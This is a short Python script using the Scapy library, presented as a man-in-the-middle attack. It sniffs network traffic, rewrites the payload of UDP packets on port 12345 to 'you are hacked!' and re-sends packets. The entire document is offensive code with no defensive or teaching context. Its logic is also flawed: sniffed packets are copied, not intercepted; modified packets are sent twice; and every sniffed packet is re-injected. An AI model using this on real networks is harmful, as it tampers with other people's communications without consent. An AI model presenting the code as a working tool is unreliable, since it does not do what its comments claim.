from scapy.all import *

def packet_callback(packet):
    if packet.haslayer(UDP) and packet.haslayer(Raw):
        # Check if it's the UDP traffic we're interested in
        if packet[UDP].dport == 12345 or packet[UDP].sport == 12345:
            print(f"Intercepted UDP packet: {packet.summary()}")
            # Modify the payload
            packet[Raw].load = b"you are hacked!"
            
            # Recalculate checksums and lengths
            del packet[IP].len
            del packet[IP].chksum
            del packet[UDP].len
            del packet[UDP].chksum

            # Send the modified packet
            send(packet, verbose=False)
            print(f"Modified and sent the packet: {packet.summary()}")
        else:
            print("Not a target UDP packet")
    
    # Forward the packet without modification if it doesn't match our filter
    send(packet, verbose=False)

# Start sniffing for UDP packets
print("Starting MITM attack...")
sniff(prn=packet_callback, store=0)
